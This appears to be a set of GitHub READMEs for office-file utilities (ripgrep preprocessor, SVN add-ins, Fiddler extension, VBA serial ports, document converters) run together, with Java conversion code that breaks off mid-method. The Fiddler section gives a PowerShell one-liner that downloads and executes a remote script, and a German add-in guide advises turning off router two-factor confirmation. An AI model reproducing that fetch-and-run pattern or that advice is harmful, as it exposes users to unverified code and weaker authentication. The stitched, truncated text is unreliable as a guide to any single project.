ColonelBuendia,rgpipe,,https://github.com/ColonelBuendia/rgpipe,https://api.github.com/repos/rgpipe/ColonelBuendia,lesspipe for ripgrep for common new filetypes using few dependencies ,"`rgpipe` is a single bash/sh script and an alias to use with ripgrep to search through a myriad of file types that are otherwise not grep friendly.  Use it with ripgrep's -pre command which allows ripgrep to selectively process files before searching.


# TL;DR

The most basic usage is to point `rgpipe` at some file, and it will attempt to print the contents of said file to stdout. 

`rgpipe MyFancyExcelFile.xlsx`

The more involved usage is as a filter in front of [ripgrep](https://github.com/BurntSushi/ripgrep) to systematically attempt to grep through the contents of assorted non-text files much as you would text files. The basic incantation looks like: 

`rg --pre-glob '*.{xlsx,pptx,docx,pdf}' --pre rgpipe ""$YourSearchTermHere""`

## Overview

I wrote up an extended gist about how to use it
[here](https://gist.github.com/ColonelBuendia/314826e37ec35c616d70506c38dc65aa)

That gist is only useful because of the kind note by BurntSushi in [this hacker news comment](https://news.ycombinator.com/item?id=19675934) explaining how `rg --pre-glob` works.

**This helps grep through:**

- New MS Office files (DOCX, PPTX, XLSX, variants thereof)  
    + Uses `unzip` and `sed`
- Old MS Office files (DOC, PPT, XLS, variants thereof) & new excel binary format
    + Uses `strings`
- LibreOffice files (ODS, ODT, ODP)  
    + Uses `unzip` and `sed`
- PDF  
    + Uses `pdftottext` from poppler
- Web/structured formats (HTML, XHTML ...)  
    + Uses `w3m` lynx and friends also works.  Not 100% necessary.  
- Web formats disguised as books (chm, epub)  
    + `unzip` and `w3m` for EPUB
    + `7zip` and `w3m` for chm


#### Specifically

Ubuntu wants: `sudo apt install poppler-utils p7zip w3m unzip`

termux wants: `pkg install poppler p7zip w3m`


## Usage notes

### Vanilla ripgrep usage

Assuming rgpipe is in path, use /path/to/rgpipe if it's not

```bash
rg --pre rgpipe YourSearchTermHere
```

### Better ripgrep usage

Above uses rgpipe even when it's not needed, which is slow, ripgrep can selectively use it with --pre-glob

```bash
rg --pre-glob '*.{xlsx,pptx,docx,pdf}' --pre rgpipe YourSearchTermHere
```

A more thorough pre glob:

```bash
rg --pre-glob '*.{pdf,xl[tas][bxm],xl[wsrta],do[ct],do[ct][xm],p[po]t[xm],p[op]t,html,htm,xhtm,xhtml,epub,chm,od[stp]}' --pre rgpipe YourSearchTermHere
```

An alias because that is a lot of typing

```bash
alias rgg=""rg -i -z --max-columns-preview --max-columns 500 --hidden --no-ignore --pre-glob \
'*.{pdf,xl[tas][bxm],xl[wsrta],do[ct],do[ct][xm],p[po]t[xm],p[op]t,html,htm,xhtm,xhtml,epub,chm,od[stp]}' --pre rgpipe""
```

### Poor man's full text search

Step 1: use rgpipe to make text sidecar files

```bash
find-rgpipe-type() {
     find `pwd` -type f -iname ""*.$1"" -exec sh -c 'for f; do rgpipe ""$f"" > ""${f%.*}.txt""; done' _ {} +
}

# or get fancy with xargs for multithreaded goodness

find-rgpipe-type-xargs() {
    find ""$(pwd)"" -type f -iname ""*.$1"" -print0 | xargs -0 -P0 -n 1 -I {} sh -c 'rgpipe ""{}"" > ""{}.txt""'
}

```

Make text sidecars for all files with PDF extension under current directory using the function defined above.  

```bash
find-rgpipe-type pdf
```

Step 2: Use ripgrep to search those files 

```bash
rg YourSearchTermHere
```

## Super useful

1 - [this hacker news comment](https://news.ycombinator.com/item?id=19675934)

2 - [The pre processing script](http://manpages.ubuntu.com/manpages/cosmic/man1/rg.1.html) that is the template into which I added some more file types

3 - midnight commander has [great scripts](https://github.com/MidnightCommander/mc/tree/0075f36b693109a34f8729d47fdf931b0481a68e/misc/ext.d) on this subject

4 - [lesspipe of course](https://github.com/wofr06/lesspipe)

5 - [rga](https://github.com/phiresky/ripgrep-all) is a rust based tool doing a similar thing

## The name

`rgpipe` because the idea is similar to lesspipe.

manually write doc(docx) by Word XML 2003

## Support :

  * MS Office 2003 +
  * WPS

## How it Works :

Firstly, the `.doc` file is a special `.xml` file if you open a doc with an editor like atom or vscode, so ,if you want to generate the doc file in the code side, you will just need to marshal your content in the doc's way ,it means that you should follow office's official OOXML guidebook .

What the `report` do is that it will provide some useful SDKs to simplify your coding .

You can learn more about it by checking `example` directory as well as clicking the `godoc` button.

Thanks for watching it :)

# In/Out 2

### Basics

This project is a rewrite of [my old web-based office in/out board](https://github.com/leoherzog/inout), written in [Google Apps Script](https://developers.google.com/apps-script/) and powered by Google Calendar. It's a simple HTML table generator that formats and displays a hard-coded list of user's current statuses on Google Calendar.

For each user, you get their **name** (with optional **phone extension**), **free/busy status**, **location**, and **duration of the event**. If the person has shared their calendar with you, you will see if they are free or busy, and if busy, event information available to you. When that user creates a new event in Google Calendar, ""Available"" vs. ""Busy"" events determine their status on the board, and ""Public"" vs. ""Private"" events determine if the details of the event are visible on the board. If you have more than one event going on at the same time, the board looks at the event that is ending latest.

Because this code is hosted and authenticated server-side on Google Apps Script, there are no dependencies or servers required. It simply generates a web page.

### Setup

1. Create a [new Google Apps Script project](https://script.google.com/) in Google Drive.
2. Copy and paste the code from the `src` folder into six files in the Apps Script project.
3. Go into **Resources** → **Advanced Google services...**, and turn on the **Calendar API**. You may have to click a link and accept some Terms of Service.
4. Go into the `config.html` file and modify your location name, latitude, longitude (all for the weather), names, phone numbers, and email addresses, as well as whether or not you'd like to show phone extensions.
5. Go into **Publish** → **Deploy as web app...**. Choose the level of access that you want to have on the in/out web page (Under **Who has access to the app:**), and click **Deploy**.

You're done! Share the link to your new In/Out board (the *Current web app URL*), or point a TV to look at that page.

### Updating

When updates are released here on Github, simply copy and paste the newer files in the `src` folder (except your config file) to your project, and go to **Publish** → **Deploy as web app...**. Increment the version number (Pick ""New"" under the **Project Version** dropdown) and click **Deploy**. You should be good to go!

## What is it

MSOfficeSVN is a set of add-ins for Microsoft Office Excel, Word and PowerPoint that assists for document version control through Subversion (SVN).\
Thanks to the MSOfficeSVN package, you can now easily version-control your MS Office files right from the MS Office menu!

MSOfficeSVN is based on [TortoiseSVN](https://tortoisesvn.net/), an established Subversion client for Windows.

Main features:
* Invoke the most frequently used version control commands directly from Microsoft Office: Update, Lock, Commit, Diff, Log, and others
* Allow shortcut keys to trigger SVN commands ; the [key mapping](#shortcut-keys) is customizable
* Notify the user if the `svn:needs-lock` property is in use (i.e. trying to edit a read-only file)

Excel 97 (JA) | ![Excel 97 ribbon menu, Japanese](https://github.com/msofficesvn/msofficesvn/raw/master/doc/ja/xl97menu.jpg)


## How to use

1. MSOfficeSVN is based on [TortoiseSVN](https://tortoisesvn.net/), that's why **you need to have previously installed [TortoiseSVN](https://tortoisesvn.net/)** for MSOfficeSVN to work!
2. MSOfficeSVN comes as a package of multiple add-ins. Follow the instructions to install the add-in(s) of your choice:  
  a. [English Instructions](https://github.com/msofficesvn/msofficesvn/blob/master/Install.md)  
  b. [Japanese Instructions](https://github.com/msofficesvn/msofficesvn/blob/master/Install_ja.md)


## Compatibility

TortoiseSVN is a Windows-only software, so does MSOfficeSVN.\
In other words, MSOfficeSVN is **not** compatible with Mac OS versions of Microsoft Office.

_As of April 29, 2021, we decided to stop supporting MS Office 2003 and older. [Already released versions](https://github.com/msofficesvn/msofficesvn/releases/) of MSOfficeSVN may fortunately be compatible with those old versions of MS Office._

The [latest release 1.4.0](https://github.com/msofficesvn/msofficesvn/releases/tag/rel-1.4.0) is compatible:
* Up to Microsoft Office 2019 (at least)
* Down to Microsoft Office 97
* With 32bit and 64bit versions of MS Office
* Up to TortoiseSVN 1.14.1 (at least)
* Down to TortoiseSVN 1.7
* With Windows OS (32bit, 64bit) where WSH is installed

Since [release 1.3.0](https://github.com/msofficesvn/msofficesvn/releases/tag/rel-1.3.0), MSOfficeSVN supports TortoiseSVN 1.7 (or later).


## Known limitations

The add-ins apply the commands to only the active document or book, so you can't use it when you wish to edit multiple files and commit them at the same time to make a ""change set"".

## Credits

Koki Yamamoto (kokiya@gmail.com)

We appreciate the valuable contribution of the original authors who created the initial programs and opened their source code to the public:\
Mr. Osamu OKANO (http://dkiroku.com/2005-07-01-11.html) \
Mr. Kazuyuki NAGAMORI (http://www.nekoconeko.com/~nagamori/wordsvn/)


--------------------------------------------------------------------------------


## Functional overview

### Commands

The add-ins can apply the following commands to the active workbook and document.

* SVN Update
* SVN Get lock
* SVN Commit
* SVN Diff
* SVN Show log
* SVN Repo-browser
* SVN Release lock
* SVN Add
* SVN Delete
* Open Explorer

Regarding `Update`, `Get lock`, `Commit` and `Release lock`, the active document or book is first closed then reopen after having applied the SVN command in order to refresh the document status.

`Open Explorer` opens the Windows Explorer and selects the active document or book.


### Needs-lock detection (a.k.a. Auto-lock feature)

Binary files stored inside a Subversion repository usually get the `svn:needs-lock` property. This forces the user to take an exclusive lock on a file before editing it, thus avoiding conflicts of two or more people working on the same file at the same time.\
http://svnbook.red-bean.com/en/1.8/svn.advanced.locking.html

As a consequence, TortoiseSVN applies a Read-only file-system flag on each file that has the `svn:needs-lock` property.\
https://tortoisesvn.net/docs/release/TortoiseSVN_en/tsvn-dug-locking.html

In MSOfficeSVN, we detect the `svn:needs-lock` and offer the possibility to take the lock on the file and make it writable. This is a way to avoid making modifications on a file you won't be able to save in the end.


### Ribbon interface and Tool bar support

This set of add-ins supports the ribbon interface of Office 2007 and newer.\
For versions where Office 2003 and older is supported (no ribbon), we provide a Tool bar instead.


### Shortcut keys

Shortcut keys are assigned by default for the Subversion commands.\
You may [edit the shortcuts mapping](https://github.com/msofficesvn/msofficesvn/blob/master/Settings.md) if you want.


### Option settings

The following option settings are available.

* Turn on/off displaying a message asking data file saving while performing a command.
* Turn on/off closing and reopening the data file in performing commit command.
* Turn on/off auto closing of the progress dialog box in the end of performing `Update`, `Commit`.

Instructions for those settings to be edited are given by the [customization documentation page](https://github.com/msofficesvn/msofficesvn/blob/master/Settings.md).

jprknight,Office365FiddlerExtension,,https://github.com/jprknight/Office365FiddlerExtension,https://api.github.com/repos/Office365FiddlerExtension/jprknight,This Fiddler Extension is an Office 365 centric parser to efficiently troubleshoot Office 365 client application connectivity and functionality.,"## Extension Purpose

This Fiddler Extension is an Office 365 centric parser to efficiently troubleshoot Office 365 client application connectivity and functionality.

## How To Use The Extension

1. Reproduce an issue / behaviour: Use Fiddler Classic, FiddlerCap, or FiddlerAnywhere to collect a trace (decrypt traffic) on the computer where the issue is seen. Save the result as a SAZ file, and transfer to your own computer.
2. Review the result (SAZ) file: On your own computer install Fiddler Classic, install the extension, and open the SAZ file.

## Deployment Script

The best way to get the Office 365 Fiddler Extension is via the deployment script. Run the below in PowerShell on your computer: 

`Invoke-Expression (New-Object Net.WebClient).DownloadString('https://aka.ms/Deploy-Office365FiddlerExtension')`

Don't want to use the aka.ms short link, or not working? Use this instead:

`Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jprknight/Office365FiddlerExtension/master/Office365FiddlerExtension/Deploy-Office365FiddlerExtension.ps1')`

![Office 365 Fiddler Extension Deployment Script](https://github.com/jprknight/Office365FiddlerExtension/blob/master/docs/Office365FiddlerExtensionDeploymentScript.png)

## Functionality Breakdown

### Colourisation of sessions
The extension enhances the default experience of Fiddler by colouring sessions in line with the session analysis performed.

Think traffic lights, with some extras.

* Red -- Something red is really broken, start here first.
* Black -- Something might be broken, but these may not be the underlying cause.
* Orange -- Something which may be a concern, see Session Analysis on the response inspector for details.
* Blue -- False positive detected, most prominiently HTTP 502's, see Session Analysis on the response inspector for details.
* Green -- Nothing bad detected.
* Gray -- Unlikely to be of interest. 

### User Interface

* **Response Inspector Tab** - Look for Session Analysis, for helpful information on any given session.
* **Office 365 Menu** - Turn off/on extension features.

### Session Columns

Columns are added into the session view on the left side of Fiddler, scroll the view to the right if you don't immediately see them. Re-order the columns to your preferences.

* **Elapsed Time** - The roundtrip time for the request/response.
* **Response Server** - What kind of device / server responded to the request.
* **Session Type** - What kind of session was detected.
* **Host IP** - IP address of the device / server which responded.
* **Authentication** - Authentication details detected in the session.

## Known limitations

* ~~Extension does not act on live captured sessions. In this scenario, session analysis can be inaccurate.~~
* Extension does not act on import, such as importing a HTTP archive. However, a HAR file can be imported, saved as a SAZ file, then loaded for the extension to work.

## 🔥 Why Visum?

**Visum was created to solve the problem of viewing office files on Linux the right way.**

The problem with Microsoft Office alternatives for Linux is that they are
**unusable** for various reasons. Libre Office has a dreaded design from the
90s, WPS needs font patching, installations result in unresolved dependencies,
partial Windows Office files compatibility, and the list goes on...

It's frustrating to install +500Mb office, patch its numerous errors only to
find out that it even can't correctly display your document. You switch to
another distro, and you go through this again.

Visum is different because it uses Microsoft Office Online version to display
your files, so you can be sure that your files are **displayed correctly**. No
more missing text, inverted colours, distorted shapes etc. Visum is very
lightweight as well, only 2 scripts and you are good to go! Suitable for
everyone, from hobbyist distro hoppers & developers, all the way to students and
non-techies.

#### Benefits of using Visum:

- 🚀 Blazingly fast

- 🔌 Customizable

- ⚡ Built on pre-installed technologies

- 💻 Lightweight to install

- 🚫 NO need for an online account

## :package: Installation

> ⚠️ Before installing Visum, make sure that you have public SSH key.
To generate one, visit [this](https://docs.github.com/en/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent#generating-a-new-ssh-key) link.

Install Visum by running these commands:

```sh
# Clone the repo
git clone https://github.com/VladimirMikulic/visum.git
# Make installer executable
chmod +x visum/install.sh
# Run the installer
./visum/install.sh
```

### Freedom to choose!

Visum gives you freedom to select the Office of your choice!

- Google's Office
- Microsoft's Office

By default, your Office files will be opened in Microsoft Office in your default browser.

You can switch Office Suites by opening and modifying Visum config file `~/.config/visum/visum.conf`.

To use Google's Office modify `VISUM_PREFERRED_OFFICE` like this:

```sh
VISUM_PREFERRED_OFFICE=GOOGLE_OFFICE
```

To switch back to Microsoft's Office:

```sh
VISUM_PREFERRED_OFFICE=MICROSOFT_OFFICE
```

That's it! Now you can view Office files in your browser! 🎉

## :cloud: Usage

Watch Visum in action! Simply double-click a file on the desktop!

![Visum Excel](./media/visum_promo_excel.gif)

## 🏔️ CLI

You can use Visum in CLI by adding this code to your `~/.bashrc`/`~/.zshrc` file:

```shell
visum() {
  bash /usr/share/visum/scripts/visum.sh $1 > /dev/null 2>&1
}
```

Now, you can run `visum <office_file_path>` and the file will be opened!

## :sparkles: Run tests

Visum uses Python 3 core lib `unittest` for testing.

Tests can be executed by running:

```sh
python3 test/test_visum.py
python3 test/test_server.py
```

If you can't install the ImageMagick you can go with _eoffice_ 0.1.6 version 
## Installation
```
library(devtools)
## install_github(""guokai8/eoffice"")
## eoffice is available on CRAN
install.packages(""eoffice"")
``` 

## Software Usage

```
library(eoffice)
library(ggplot2)
## make a figure with you custom function
plot(mtcars$mpg, mtcars$disp)
topptx(filename = ""mtcars.pptx"")
## You can also use ggplot 
ggplot(mtcars, aes(mpg, disp, color = factor(cyl))) + geom_point()
topptx(filename = ""mtcars.pptx"")
## or todocx(filename = ""mtcars.docx"")
p <- ggplot(mtcars, aes(mpg, disp, color = factor(cyl))) + geom_point()
topptx(p, filename = ""mtcars.pptx"", width = 6, height = 4)
## use above method if you want use topptx with ggplot function in a loop
## write out table to office
totable(head(mtcars), filename = ""mtcars.docx"")
totable(head(mtcars), filename = ""mtcars.pptx"")
## append was supported if you want add figures or tables.
## Now support direct output of common objects produced by R statistical functions
tt <- t.test(wt ~ am, mtcars)
totable(tt, filename = ""mtcars_test.pptx"")
totable(t.test(wt ~ am, mtcars), filename = ""mtcars_test.pptx"")
## inpptx and indocx provide function read the tables in pptx or docx
tabs <- inpptx(filename = ""mtcars.pptx"", header = TRUE)
## output different figure formats
tofigure(ggplot(mtcars, aes(mpg, disp, color = factor(cyl))) + geom_point(),filename = ""mtcars.pdf"")
tofigure(ggplot(mtcars, aes(mpg, disp, color = factor(cyl))) + geom_point(),filename = ""mtcars.eps"")
## display figure with plotly
tohtml(p, save = FALSE)
## if you use basic plot function or other plot function you need first use convertplot to convert 
## it to ggplot object when you are working on the platform without GUI
p <- convertplot(plot(1:10))
tofigure(p, filename = ""test.pdf"")
topptx(p, filename = ""test.pptx"")
## if you use ggplot like function you don't need to transform the format
```
## Note
The _eoffice_ just a package for funs. _eoffice_ depends on _officer_ and _rvg_ package which include lots of fantastic functions. Here, _eoffice_ provides simplified functions which could be save some time to learn the complete functions from above packages. And there are some other packages provide these functions. Comparing with these packages, _eoffice_ include own features which I think really helpful to me.  Besides, _eoffice_ also provide functions to read tables from pptx and docx. Read graphics and extract colors from the figures are available now.

Similar to [DocX](https://github.com/WordDocX/DocX) but based on the [Open XML SDK](https://github.com/OfficeDev/Open-XML-SDK) instead of directly
working with the underlying XML. The [Open XML SDK](https://github.com/OfficeDev/Open-XML-SDK) is very powerful but requires a significant amount of coding. This library provides an abstraction layer 
greatly reducing the amount of code you have to write and maintain.

This initial phase is very much a minimum viable product, only implementing features as they are required. Currently there is no support for reading
existing Word documents.

Stay tuned, under development

Easy to use **[Google Apps Script](https://script.google.com)** [Spreadsheet API](https://developers.google.com/apps-script/reference/spreadsheet) (using Method chaining)

## Features

- ⚡️ Installing scripts into your project Super-Fast!
- ⚡️ Easy to use, data insertion and styling
- ⚡️ Handling of external Google Sheets files
- ⚡️ Support for a variety of utility methods to simplify sheet operations

## Installation

### Step 1. Install `clasp`

In order to properly use all configuration of `clasp`, you need to change the Enabled setting of Google Apps Script API to 'Enable' after logging in with your Google account on the next page: https://script.google.com/home/usersettings

The clasp package must be installed for automatic installation in `Google Drive`.

```shell
$ npm install -g @google/clasp
```

If you have set up the development environment in this project, you can install it through `npm i`, so you don't need to install the package globally.

You may need a `clasp` login before proceeding. Skip if you have already done this:

```shell
$ clasp login
```

### Step 2-A. Create Google SpreadSheet script in your workspace

You can create Google Sheets and script projects in Google Drive. We recommend running your own scripts with everything integrated.

#### [Method 1] Create automatically (recommended)

This npm script helps you quickly and easily push scripts to your new spreadsheet file using `clasp`.

```shell
$ npm run create
```

#### [Method 2] Create manually

```shell
$ clasp create
```

Follow the `clasp`'s prompts to create a spreadsheet in the `Google Drive` top-level path. After you open that sheet, the script will be installed automatically.

Make sure a `.clasp.json` file is created in your project root. After that, you can install the script into the document with the command below.

```shell
$ clasp push
```

### Step 2-B. Manual Installation

If you already have a Google Script project created, or if you want to add your own script files, follow the steps below.

Put the `SheetIO.js` file in project directory into your new **[Google Apps Script](https://script.google.com/)** project file and use it.

You can also use additional `App.js` and `Test.js` files if necessary.

## Usage

```javascript
// Create a SheetIO instance.
const Sheet = new SheetIO();

// Create a new sheet 'Users'.
Sheet.create('Users');

// Specifies where the currently active sheet is, allowing cells to be processed.
const targetSheet = Sheet.active('Users');

// The general method is similar to that of the Google Apps Script Spreadsheet.
targetSheet.getRange(1, 1).getValue();

// Continuous use possible with method chaining.
targetSheet
  .clearAll()
  .insertLastRow([['ID', 'Name', 'Age', 'Gender', 'Created', 'Updated', 'Subscription']])
  .insertLastRow([
    ['1', 'Lee', '26', 'M', '2021-11-01', '2021-11-01', 'Y'],
    ['2', 'James', '31', 'M', '2021-10-25', '2021-11-15', 'N'],
    ['3', 'Katy', '25', 'W', '2020-09-11', '2021-05-24', 'Y'],
    ['4', 'Betty', '27', 'W', '2021-03-09', '2021-11-11', 'N'],
    ['5', 'Mike', '32', 'M', '2020-07-29', '2020-09-06', 'N']
  ]);
```

## Using API / Methods

Related descriptions are attached to the entire method of `SheetIO.js`, and the main method of the default API commonly used in Spreadsheet of **Google Apps Script** is overridden.

Not all Spreadsheet methods may be compatible. If there is a method you would like to request, please leave an issue or send a PR.

Serialcomms,Serial-Ports-in-VBA-new-for-2022,,https://github.com/Serialcomms/Serial-Ports-in-VBA-new-for-2022,https://api.github.com/repos/Serial-Ports-in-VBA-new-for-2022/Serialcomms,Using Serial COM Ports in Visual Basic for Applications (VBA7),"# VBA Serial Port routines for Microsoft Office
## New for 2022 - Windows 10, Office 2019 (Excel, Word, Access)

Getting Serial (COM) Ports working as intended in VBA can be surprisingly difficult in certain usage scenarios. 

New VBA routines here will help resolve these issues in Excel, Word and Access (Windows PC versions only).

Functions are straightforward to use with coding style to support infrequent VBA users and developers.

Intended to help implement ad-hoc projects for serial data acquisition or transfer.

No plug-ins, DLLs, ActiveX, licences, payments or registrations are required.  

<details><summary>More Information</summary>
<p>
   
<details><summary>VBA Issues</summary>
<p>

The in-built VBA functions for COM Port data can suffer from the following issues :- 
   
1. Setting port parameters with the VBA open command may not work in some Windows versions e.g.

   `Open ""COM1:9600,N,8,1"" For Read Access As #1`       \
     _(command line workaround known, settings can revert after reboot)_

2. Attempting to read data when there is none waiting will cause VBA to hang with a 'not responding' message.  
  
   `Get #1, , Read_Data_Byte`  
   
   The new functions address both of these issues, and also where data transfers take longer than the 5-6 second VBA timeout.
   
</p>
</details>   

<details><summary>Background</summary>  
<p>

The legacy of serial comms means that many online solution searches are now time-expired with links to defunct web sites etc.    

New functions here are therefore a fresh start for 2022 and are based largely on Microsoft's Win32 API calls and documentation. 

Developed on Windows 10 (64-Bit) with a local Microsoft Office 2019 Professional (32-Bit VBA7) installation.  

Tested on Office 2016 Professional (64-bit VBA7) and Office 2019 Professional (32-Bit VBA7)    

</p>
</details>

<details><summary>COM Ports</summary>
<p>

Multiple com ports are supported, including physical hardware ports and synthetic virtual software ports. 

All read and write functions are synchronous, in part because not all serial port types support overlapped operation.

Performance on a modern PC is good, with software timing delays required to allow the relatively slow serial com ports to catch up. 

Reading, Writing and Waiting are 'timesliced' to ensure that VBA remains responsive during any extended data transfers or waiting times. 

</p>
</details>

<details><summary>Debugging</summary>
<p>

* Debugging can be set on/off per port with results shown in the VBA immediate window. 

* Extensive debug functionality makes several modules quite verbose. 

</p>
</details>  

<details><summary>Other Versions</summary>
<p> 

* [No-Debug](No-Debug)      (more compact)

* [Simplified](https://github.com/Serialcomms/Serial-Ports-in-VBA-Simple-2022)   (single com port)

* [Minimal](https://github.com/Serialcomms/Serial-Ports-in-VBA-Extra-Simple-2022)   (single com port, no settings)

* [VBA6 / 32-Bit](https://github.com/Serialcomms/Serial-Ports-in-VBA6-legacy-for-2022)  (legacy Windows/Office)

</p>
</details>   
     
<details><summary>Optional steps for Excel only</summary>
<p>  

- Functions can be used directly in Worksheet cells as formulas where appropriate.  
- Remove comment mark before `Option Private Module` to prevent function names appearing in cell formula drop-down lists.  
- Remove comment mark before `Application.Volatile` where indicated to refresh results when functions are used in cells and the worksheet is recalculated (e.g. with F9 key).

===========
NPOI is a free tool which supports xls, xlsx and docx extensions. This project is the .NET version of POI Java project at http://poi.apache.org/. POI is an open source project, which can help you read/write XLS, DOC, PPT files. It covers most features of Excel like styling, formatting, data formulas, extract images, etc.. The good thing is, it doesn’t require Microsoft Office to be installed on the server.

For example, you can use it to Generate an Excel report without Microsoft Office suite installed on your Server and more efficient than calling Microsoft Excel ActiveX in the background.
    Extract text from Office documents to help you implement full-text indexing feature (most of the time this feature is used to create search engines).
    Extract images from Office documents.
    Generate Excel sheets, which contains formulas.

Let’s create an ASP.NET Core Razor Page application. Open Visual Studio 2017. Hit File-> New Project -> Select ASP.NET Core Web Application. Enter the project name and say “OK”. Select “Web Application” from the next dialog. 

Once the project is created, install NPOI package for .NET Core. To install, run the following command in the Package Manager Console:

```
PM> Install-Package DotNetCore.NPOI
```

To show,

- Import: We’ll upload an excel file on the server and then process it using NPOI.
- Export: We’ll create an excel file with some dummy data using NPOI and download the same in the browser.

### Voraussetzungen
Für die Nutzung des Addins wird benötigt: 
1. eine (halbwegs) aktuelle AVM Fritz!Box mit Telefoniefunktion.
   1. Damit dieses Addin korrekt arbeiten kann, muss ein Nutzer mit Administratorrechten darauf zugreifen. 
   2. Das Loginverfahren ohne Benutzername wird seitens AVM nicht mehr unterstützt. Das heißt ab FRITZ!OS 7.25 muss ein Benutzer angegeben werden, da ansonsten die Fritz!Box jeden Zugriff verweigert. ([Info AVM](https://avm.de/fileadmin/user_upload/Global/Service/Schnittstellen/Empfehlungen%20zur%20Benutzerfu%CC%88hrung%20bei%20der%20Anmeldung%20an%20einer%20FRITZ%21Box_v1.1.pdf))
   3. Die Zweifaktor-Authentifizierung der Fritz!Box ~muss~ sollte deaktiviert werden, damit das Wählen mit dem ausgewählten Telefon möglich ist. In der Fritz!Box ~muss~ sollte die Option 
      `Ausführung bestimmter Einstellungen und Funktionen zusätzlich bestätigen` unter `System / FRITZ!Box - Benutzer / Anmeldung im Heimnetz` deaktiviert sein. Hinweis: Ab Version 5.0.3.17 (Testversion) wird die Zweifaktor-Authentifizierung unterstützt.
   4. Der Fritz!Box CallMonitor muss aktiviert sein: Hierzu den Telefoncode `#96*5*` per Telefon wählen.
   5. Zur Kommunikation mit der Fritz!Box wird u. a. die TR064-Schnittstelle verwendet. Daher darf diese nicht deaktiviert werden.
2. Microsoft Outlook (2010 bis 2021 inkl. 365)
3. [Microsoft .NET Framework 4.8](https://dotnet.microsoft.com/download/dotnet-framework/net48) und [Microsoft Visual Studio 2010 Tools for Office Runtime Redistributable (VSTO 2010)](https://www.microsoft.com/de-DE/download/details.aspx?id=48217)
   Bei der Installation wird geprüft, ob beides bereits installiert ist. Falls nicht, werden beide Komponenten heruntergeladen und installiert. **Ich empfehle jedoch, diese beiden Komponenten vorab zu installieren.**

chirag-ji,DocuConverter,,https://github.com/chirag-ji/DocuConverter,https://api.github.com/repos/DocuConverter/chirag-ji,"An api and library that converts documents from one format to another, say DOCX to PDF or PPT to PDF","# DocuConverter
[![](https://jitpack.io/v/chirag-ji/DocuConverter.svg)](https://jitpack.io/#chirag-ji/DocuConverter)


A standalone Java Library and API to convert the Microsoft Office Documents to other format very quickly.

***Note**:   This API is build on JDK 1.8 and hence it requires JRE 8 or above to run.*

## Features
- Light Weight process
- Quick Conversion
- Less fail rates


## Why I wrote this API
I faced many problem in converting files from one format to another format from, say, *DOCX* to *PDF* and to do that simple task, any one have to look to many sources to get the working code, otherwise have to use other properity software or heavy softwares to convert them. For many developers, this was the headache to code and test and so on... so to solve this problem and keeping in mind the headache of this searching, I created this API which is very handy  to use, and can be also used in your Applications too


## API Uses in your program

```java
    File inFile = new File(""test/test.docx"");
    File outFile = new File(""test/testDocX.pdf"");
    DocuConverter docuConverter = DocuConverter.getConverter(new FileInputStream(inFile),
            DocumentType.DOCX, ConvertToType.PDF);
    docuConverter.setVerbose(true); //optional, only if you want the log output
    docuConverter.convertIn(new FileOutputStream(outFile));
```

Any **OutputStream** and **InputStream** can be used here,
Like to get the code in ***ByteArrayOutputStream***, we can write

```java
    File inFile = new File(""test/test.docx"");
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    DocuConverter docuConverter = DocuConverter.getConverter(new FileInputStream(inFile),
            DocumentType.DOCX, ConvertToType.PDF);
    docuConverter.setVerbose(true); //optional, only if you want the log output
    docuConverter.convertIn(byteArrayOutputStream);
    System.out.println(byteArrayOutputStream);
```

 ### Including API in your project

## 1. [Windows平台]使用Microsoft Office

### 1.1 特点

优点：

- 兼容好；
- 速度快；

缺点：

- 只能在Windows平台使用；

### 1.2 依赖

- Microsoft Office

- [jacob](https://sourceforge.net/projects/jacob-project/)

  > JACOB is a JAVA-COM Bridge that allows you to call COM Automation components from Java. It uses JNI to make native calls to the COM libraries. JACOB runs on x86 and x64 environments supporting 32 bit and 64 bit JVMs . **需要把jacob-x.xx-x64.dll放到java/bin(与java.exe相同)目录下**

### 1.3 示例

支持office所有格式文档，每个文档转换调用接口略有区别。

**word转pdf：**

```java
import com.jacob.activeX.ActiveXComponent;
import com.jacob.com.ComThread;
import com.jacob.com.Dispatch;
import org.junit.Test;

import java.io.File;

public class Word2PdfTest {
    
	/**
     * 测试本地Office转换word到pdf
     */
    @Test
    public void testWord() {
        String source = ""d:\\tmp\\test1.doc"";
        String target = ""d:\\tmp\\test.pdf"";

        long start = System.currentTimeMillis();
        ActiveXComponent app = null;
        Dispatch doc = null;
        try {
            File targetFile = new File(target);
            if (targetFile.exists()) {
                targetFile.delete();
            }

            ComThread.InitSTA();
            app = new ActiveXComponent(""Word.Application"");
            app.setProperty(""Visible"", false);
            Dispatch docs = app.getProperty(""Documents"").toDispatch();

            System.out.println(""打开文档"" + source);
            doc = Dispatch.call(docs, ""Open"", source, false, true).toDispatch();

            System.out.println(""转换文档到PDF "" + target);
            Dispatch.call(doc, ""SaveAs"", target, 17); // wordSaveAsPDF为特定值17

            long end = System.currentTimeMillis();
            System.out.println(""转换完成用时："" + (end - start) + ""ms."");
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (doc != null) {
                Dispatch.call(doc, ""Close"", false);
            }

            if (app != null) {
                app.invoke(""Quit"", 0); // 不保存待定的更改
            }

            ComThread.Release();
        }
    }
}
```

             * param 4: ReadOnly
             * param 5: Untitled指定文件是否有标题
             * param 6: WithWindow指定文件是否可见
             * */
            System.out.println(""打开文档"" + source);
            ppt = Dispatch.call(ppts, ""Open"", source, true, true, false).toDispatch();

            System.out.println(""正在转换为PDF "" + target);
            Dispatch.call(ppt, ""SaveAs"", target, 32); // pptSaveAsPDF为特定值32

            long end = System.currentTimeMillis();
            System.out.println(""转换完成用时："" + (end - start) + ""ms."");
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (ppt != null) {
                Dispatch.call(ppt, ""Close"");
            }

            if (app != null) {
                app.invoke(""Quit"");
            }
            ComThread.Release();
        }

            File inputFile = new File(source);

            // 已经存在pdf文件，删除
            File outputFile = new File(target);
            if (outputFile.exists()) {
                outputFile.delete();
            }

            // 启动OpenOffice的服务
            System.out.println(""启动OpenOffice..."");
            officeManager.start();

            // 转换pdf
            System.out.println(""开始使用OpenOffice转换..."");
            JodConverter.convert(inputFile).to(outputFile).execute();
            System.out.println(""转换完成，耗时："" + (System.currentTimeMillis() - start) + ""ms"");
        } catch (OfficeException e) {
            e.printStackTrace();
        } finally {
            // 关闭OpenOffice
